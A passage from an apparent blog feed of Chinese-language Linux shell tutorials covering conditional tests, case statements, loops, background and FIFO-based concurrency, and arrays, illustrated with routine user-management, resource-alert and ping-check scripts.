-p &quot;Input a username: &quot; user</span><br><span class="line">id $user &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;user $user already exsits.&quot;</span><br><span class="line">else</span><br><span class="line">useradd $user</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;$user created.&quot;</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><ul><li>整数测试在脚本中的应用：磁盘可用空间告警</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat disk_use.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">. /etc/profile</span><br><span class="line">disk_use=`df -Th |grep &#x27;/$&#x27;|awk &#x27;&#123;print $(NF-1)&#125;&#x27;|awk -F&quot;%&quot; &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">if [ $disk_use -ge 5 ];then</span><br><span class="line">echo &quot;`date +%F&quot; &quot;%T` disk used: $&#123;disk_use&#125;%&quot;</span><br><span class="line">fi</span><br><span class="line">[root@hdp-1 shell]# ./disk_use.sh </span><br><span class="line">2021-12-06 14:53:46 disk used: 42%</span><br></pre></td></tr></table></figure><ul><li>整数测试在脚本中的应用：内存可用空间告警</li><li>shell 语法检查：bash -n <a href="http://xxx.sh">xxx.sh</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat mem_use.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mem_used=`free -m |grep &#x27;^M&#x27; |awk &#x27;&#123;print $3&#125;&#x27;`</span><br><span class="line">mem_total=`free -m |grep &#x27;^M&#x27; |awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">mem_percent=$[mem_used*100/mem_total]</span><br><span class="line">var_file=`date +%F`.log</span><br><span class="line">if [ $mem_percent -ge 10 ];then</span><br><span class="line">echo &quot;`date +%F&quot; &quot;%T` memory used: $&#123;mem_percent&#125;%&quot; &gt;$var_file</span><br><span class="line">fi</span><br><span class="line">[root@hdp-1 shell]# ./mem_use.sh </span><br><span class="line">[root@hdp-1 shell]# cat 2021-12-06.log </span><br><span class="line">2021-12-06 14:54:44 memory used: 79%</span><br></pre></td></tr></table></figure><h3 id="23-字符串测试"><a class="markdownIt-Anchor" href="#23-字符串测试">#</a> 2.3 字符串测试</h3><ul><li>字符串测试操作符的作用包括比较字符串是否相同、测试字符串的长度是否为 0。书写表达式为 [字符串 1 = 字符串 2]、[ 字符串 1 ！= 字符串 2 ] 或 [ -z 字符串 ]。字符串测试运算符如表所示。</li></ul><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>-z</td><td>判断字符串长度是否为 0</td></tr><tr><td>-n</td><td>判断字符串长度是否为非 0</td></tr><tr><td>!</td><td>判断两个字符串是否不相等</td></tr><tr><td>=</td><td>判断两个字符串是否相等</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# [ $USER = root ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ $USER = hadoop ];echo $?</span><br><span class="line">1</span><br><span class="line">[root@hdp-1 shell]# [ $USER != hadoop ];echo $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure><ul><li>双引号的作用</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# [ &quot;$USER&quot; != hadoop ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ &quot;$USER&quot; = root ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# echo $username</span><br><span class="line"></span><br><span class="line">[root@hdp-1 shell]# [ $username = root ];echo $?</span><br><span class="line">-bash: [: =: 期待一元表达式</span><br><span class="line">2</span><br><span class="line">[root@hdp-1 shell]# [ &quot;$username&quot; = root ];echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>字符串长度测试：空串、未定义变量的长度都是 0</li><li>字符串必须使用双引号</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# var=&quot;&quot;</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;#var&#125;</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -z $var ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -n $var ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -z &quot;$var&quot; ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -n &quot;$var&quot; ];echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>字符串测试在脚本中的应用</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat install.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ $user ! = root ];then</span><br><span class="line">echo &quot;Permission Denied&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">yum install httpd</span><br></pre></td></tr></table></figure><ul><li>以上是安装服务的脚本，判断变量 user 的值是否为 root，如果为 root 则安装 httpd，<br>如果不是 root，则显示” 你没有权限”。</li></ul><h3 id="24-逻辑运算符"><a class="markdownIt-Anchor" href="#24-逻辑运算符">#</a> 2.4 逻辑运算符</h3><ul><li>在 Shell 条件测试中，使用逻辑运算符实现复杂的条件测试，逻辑运算符用于操作两个变量。逻辑运算符语法格式。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ 表达式1 ] 操作符 [ 表达式2 ]</span><br><span class="line">or</span><br><span class="line">命令1 操作符 命令2</span><br></pre></td></tr></table></figure><ul><li>逻辑操作符</li></ul><table><thead><tr><th>运算符</th><th>含义</th></tr></thead><tbody><tr><td>-a 或 &amp;&amp;</td><td>判断操作符两边均为真，结果为真，否则为假，” 逻辑与”</td></tr><tr><td>-o 或 ||</td><td>判断操作符两边一边为真，结果为真，否则为假，” 逻辑或”</td></tr><tr><td>!</td><td>判断操作符两边均为假，结果为真，否则为假，” 逻辑否”</td></tr></tbody></table><ul><li>-a 和 &amp;&amp; 的运算规则。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# [ 1 -lt 2 -a 5 -gt 10 ];echo $?</span><br><span class="line">1</span><br><span class="line">[root@hdp-1 shell]# [ 1 -lt 2 -o 5 -gt 10 ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [[ 1 -lt 2 &amp;&amp; 5 -gt 10 ]];echo $?</span><br><span class="line">1</span><br><span class="line">[root@hdp-1 shell]# [[ 1 -lt 2 || 5 -gt 10 ]];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# </span><br></pre></td></tr></table></figure><ul><li>应用：创建批量用户</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat user_add.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -p &quot;Please input a username: &quot; user</span><br><span class="line">id $user &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;user $user already exists.&quot;</span><br><span class="line">else</span><br><span class="line">useradd $user</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;user created.&quot;</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><ul><li>应用：创建批量用户</li></ul><h3 id="case-条件语句"><a class="markdownIt-Anchor" href="#case-条件语句">#</a> case 条件语句</h3><ul><li>case 条件语句相当于多分支的 if/elif/else 条件语句</li><li>case 条件语句比 if 语句更加简洁工整，故常应用在实现系统服务启动脚本等应用场景中。</li><li>在 Shell 编程中，case 语句有固定的语法格式。其语法格式为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">case 变量值 in</span><br><span class="line">  条件表达式1）</span><br><span class="line">    代码块1</span><br><span class="line">    ；；</span><br><span class="line">  条件表达式2）</span><br><span class="line">    代码块2</span><br><span class="line">    ；；</span><br><span class="line">  条件表达式3）</span><br><span class="line">    代码块3</span><br><span class="line">    ；；</span><br><span class="line">  *）</span><br><span class="line">    默认代码块</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><ul><li>条件表达式匹配如表所示。</li></ul><table><thead><tr><th>条件表达式</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>任意字符</td></tr><tr><td>?</td><td>任意单个字符</td></tr><tr><td>[abc]</td><td>其中之一</td></tr><tr><td>[a-z]</td><td>区间之一</td></tr><tr><td>|</td><td>多重选择</td></tr></tbody></table><ul><li>case 条件语句案例实战</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat user_del.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> delete user</span></span><br><span class="line"></span><br><span class="line">read -p &quot;Input a username: &quot; user</span><br><span class="line">id $user &amp;&gt;/dev/null</span><br><span class="line">if [ $? -ne 0 ];then</span><br><span class="line">echo &quot;no such user: $user&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">read -p &quot;Are you sure?[y/n]: &quot; action</span><br><span class="line">case &quot;$action&quot; in</span><br><span class="line">y|Y|yes|YES)</span><br><span class="line">userdel -r $user</span><br><span class="line">echo &quot;user $user deleted. &quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;error! &quot;</span><br><span class="line">exit 2</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell循环结构</title>
      <link href="/2021/09/14/Linux%20Shell/Linux%20Shell%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/"/>
      <url>/2021/09/14/Linux%20Shell/Linux%20Shell%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="3-循环结构"><a class="markdownIt-Anchor" href="#3-循环结构">#</a> 3 循环结构</h2><ul><li>Shell 语言支持四种循环语句：for、while、until、select</li><li>工作中常用的是 for、while、until</li></ul><h3 id="for循环语法结构"><a class="markdownIt-Anchor" href="#for循环语法结构">#</a> for 循环语法结构</h3><ul><li>for 循环主要用于确定次数的循环</li><li>第一种 for 循环的语法结构如下所示：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量名 in 取值列表</span><br><span class="line">do</span><br><span class="line">循环体</span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>for 循环语句实现批量主机 ping 探测</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat for_ping.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for name in baidu 163 hao123</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">host=www.$name.com</span><br><span class="line">ping -c1 -w1 $host &amp;&gt; /dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;$host&quot; | tee -a host.txt</span><br><span class="line">fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br><span class="line">echo &quot;Mission Completed.&quot;</span><br></pre></td></tr></table></figure><ul><li>for 循环语句实现文件中批量用户创建</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat users_from_file.sh </span><br><span class="line">IFS=$&#x27;\n&#x27;</span><br><span class="line">for line in `cat $1`</span><br><span class="line">do</span><br><span class="line">if [ $&#123;#line&#125; -eq 0 ];then</span><br><span class="line">continue</span><br><span class="line">fi</span><br><span class="line">user=`echo &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">pass=`echo &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">id $user &amp;&gt;/dev/nuil</span><br><span class="line">if [ $? -eq 0 ] ;then</span><br><span class="line">echo &quot;user $user already exists&quot;</span><br><span class="line">else</span><br><span class="line">useradd $user</span><br><span class="line">echo &quot;$pass&quot; | passwd --stdin $user &amp;&gt; /dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;$user created&quot;</span><br><span class="line">fi</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="while循环语句语法结构"><a class="markdownIt-Anchor" href="#while循环语句语法结构">#</a> while 循环语句语法结构</h3><ul><li>while 循环语句的基本语法为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 条件测试</span><br><span class="line">do</span><br><span class="line">    循环体</span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>while 循环语句会对条件测试进行判断，如果条件测试成立时，则执行 do 和 done 之间的循环体，直到条件测试不成立才停止循环。</li><li>while 循环语句实现批量用户创建</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat while_user.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">if [ $&#123;#line&#125; -eq 0 ];then</span><br><span class="line">echo &quot;NULL&quot;</span><br><span class="line">continue</span><br><span class="line">fi</span><br><span class="line">user=`echo $line | awk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">pass=`echo $line | awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">id $user &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;user $user already exists.&quot;</span><br><span class="line">else</span><br><span class="line">useradd $user</span><br><span class="line">echo &quot;$pass&quot;| passwd --stdin $user &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ] ;then</span><br><span class="line">echo &quot;$user created .&quot;</span><br><span class="line">fi</span><br><span class="line">fi</span><br><span class="line">done &lt; $1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="until循环语句语法结构"><a class="markdownIt-Anchor" href="#until循环语句语法结构">#</a> until 循环语句语法结构</h3><ul><li>until 循环语句基本语法为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until 条件测试</span><br><span class="line">do</span><br><span class="line">循环体</span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>until 循环语句是在条件表达式不成立时，进入循环体执行指令，条件表达式成立时，终止循环。until 的应用场景很罕见。</li><li>until 循环语句测试远程主机可达性</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat until_ping.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">host=www.baidu.com</span><br><span class="line">until ping -c1 -w1 $host &amp;&gt;/dev/null</span><br><span class="line">do</span><br><span class="line">sleep 1</span><br><span class="line">done</span><br><span class="line">echo &quot;$host up. &quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell进阶</title>
      <link href="/2021/09/14/Linux%20Shell/Linux%20Shell%E8%BF%9B%E9%98%B6/"/>
      <url>/2021/09/14/Linux%20Shell/Linux%20Shell%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="4-并发控制"><a class="markdownIt-Anchor" href="#4-并发控制">#</a> 4 并发控制</h2><ul><li>默认情况下，Shell 命令是串行方式自上而下执行的，但如果有大量的命令需要执行，串行就会浪费大量的时间，这就需要采用并发执行。</li></ul><h3 id="41-利用后台执行实现并发"><a class="markdownIt-Anchor" href="#41-利用后台执行实现并发">#</a> 4.1 利用后台执行实现并发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat back_ping.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..254&#125;</span><br><span class="line">do </span><br><span class="line">&#123;</span><br><span class="line">ip=10.10.10.$i</span><br><span class="line">ping -c1 -w1 $ip &amp;&gt; /dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;$ip is up.&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;$ip is down.&quot;</span><br><span class="line">fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br><span class="line">echo &quot;Mission Completed&quot;</span><br></pre></td></tr></table></figure><h3 id="利用管道实现并发控制"><a class="markdownIt-Anchor" href="#利用管道实现并发控制">#</a> 利用管道实现并发控制</h3><ul><li>使用 Linux 管道文件特性制作队列，可以控制并发数量。</li><li>管道分为命名管道和匿名管道。</li><li>创建命名管道文件命令是 mkfifo</li><li>命名管道可跨终端实现数据交换</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat 255_ping.sh </span><br><span class="line">thread=5</span><br><span class="line">tmp_fifofile=/tmp/$$.fifo</span><br><span class="line">mkfifo $tmp_fifofile</span><br><span class="line">exec 8&lt;&gt;$tmp_fifofile</span><br><span class="line">rm $tmp_fifofile</span><br><span class="line">for i in `seq $thread`</span><br><span class="line">do</span><br><span class="line">echo &gt;&amp;8</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for i in &#123;1..254&#125;</span><br><span class="line">do</span><br><span class="line">read -u 8</span><br><span class="line">&#123;</span><br><span class="line">ip=10.0.0.$i</span><br><span class="line">ping -c1 -w1 $ip &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">echo &quot;$ip is up.&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;$ip is down . &quot;</span><br><span class="line">fi</span><br><span class="line">echo &gt;&amp;8</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br><span class="line">exec 8&gt;&amp;-</span><br><span class="line">echo &quot;misson completed.&quot;</span><br></pre></td></tr></table></figure><h2 id="5-shell-数组"><a class="markdownIt-Anchor" href="#5-shell-数组">#</a> 5 Shell 数组</h2><h3 id="51-shell数组的基本概念"><a class="markdownIt-Anchor" href="#51-shell数组的基本概念">#</a> 5.1 Shell 数组的基本概念</h3><ul><li>用于区分不同元素的编号称为数组下标。</li><li>数组的元素有时也称为下标变量。</li><li>数组分为普通数组和关联数组</li><li>普通数组中的索引是整数，关联数组的数组索引可以用文本。</li><li>关联数组使用之前需要声明</li><li>关联数组由键值对组成。</li></ul><h4 id="511-普通数组"><a class="markdownIt-Anchor" href="#511-普通数组">#</a> 5.1.1 普通数组</h4><ul><li>普通数组中：数组元素的索引（下标）从 0 开始编号，获取数组中的元素要利用索引（下标）。索引（下标）可以是算术表达式，其结果必须是一个整数。</li><li>普通数组定义。</li><li>下标从 0 开始</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# books=(linux shell awk openstack docker)</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;books[3]&#125;</span><br><span class="line">openstack</span><br></pre></td></tr></table></figure><h4 id="512-关联数组"><a class="markdownIt-Anchor" href="#512-关联数组">#</a> 5.1.2 关联数组</h4><ul><li>关联数组和普通数组所不同的是，它的索引下标可以是任意的整数和字符串。</li><li>关联数组定义。eg: info=([name]=tianyun [sex]=male [age]=36 [height]=170 [skill]=cloud)</li></ul><h4 id="513-数组声明"><a class="markdownIt-Anchor" href="#513-数组声明">#</a> 5.1.3 数组声明</h4><ul><li>关联数组需要先声明后使用。</li><li>通常情况下 Shell 解释器隐式声明普通数组。</li><li>声明普通数组的方法为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare -a array</span><br></pre></td></tr></table></figure><ul><li>声明关联数组的方法为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare -A array</span><br></pre></td></tr></table></figure><h3 id="52-shell数组的定义"><a class="markdownIt-Anchor" href="#52-shell数组的定义">#</a> 5.2 Shell 数组的定义</h3><ul><li>在 Linux Shell 中，定义一个数组有多种方法，需要先按照命令规则给数组命名，然后再定义数组的值。数组的定义方法有直接定义数组、下标定义数组、间接定义数组和从文件中读入定义数组，接下来详细介绍定义数组的方法。</li></ul><h4 id="521-直接定义数组"><a class="markdownIt-Anchor" href="#521-直接定义数组">#</a> 5.2.1 直接定义数组</h4><ul><li>直接定义数组是用小括号将变量值括起来赋值给数组变量，每个变量值之间要用空隔进行分隔。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# books=(linux shell awk openstack docker)</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;books[3]&#125;</span><br><span class="line">openstack</span><br></pre></td></tr></table></figure><h4 id="522-下标定义数组"><a class="markdownIt-Anchor" href="#522-下标定义数组">#</a> 5.2.2 下标定义数组</h4><ul><li>下标定义数组是用小括号将变量值括起来，同时采用键值对的形式赋值。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_name=([1]=value1 [2]=value2 [3]=value3 ...)</span><br></pre></td></tr></table></figure><ul><li>此种方法为 key-value 键值对的形式，小括号里对应的数字为数组下标，等号后面的内容为下标对应的数组变量的值。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# declare -A info</span><br><span class="line">[root@hdp-1 shell]# info=([name]=tianyun [sex]=male [age]=36 [height]=170 [skill]=cloud)</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;info[name]&#125;</span><br><span class="line">tianyun</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;info[skill]&#125;</span><br><span class="line">cloud</span><br></pre></td></tr></table></figure><h4 id="523-间接定义数组"><a class="markdownIt-Anchor" href="#523-间接定义数组">#</a> 5.2.3 间接定义数组</h4><ul><li>间接定义数组是分别通过定义数组的方法来定义。其语法格式为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_name[0]=value1;array_name[1]=value2;array_name[2]=value3 </span><br></pre></td></tr></table></figure><ul><li>此种方法要求一次赋一个值，比较复杂。具体如下所示。</li><li>间接定义数组。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# array[0]=pear</span><br><span class="line">[root@hdp-1 shell]# array[1]=apple</span><br><span class="line">[root@hdp-1 shell]# array[2]=orange</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;array[1]&#125;</span><br><span class="line">apple</span><br><span class="line">[root@hdp-1 shell]# echo &quot;You are the $&#123;array[1]&#125; of my eye.&quot;</span><br><span class="line">You are the apple of my eye.</span><br></pre></td></tr></table></figure><h4 id="524-从文件中读入定义数组"><a class="markdownIt-Anchor" href="#524-从文件中读入定义数组">#</a> 5.2.4 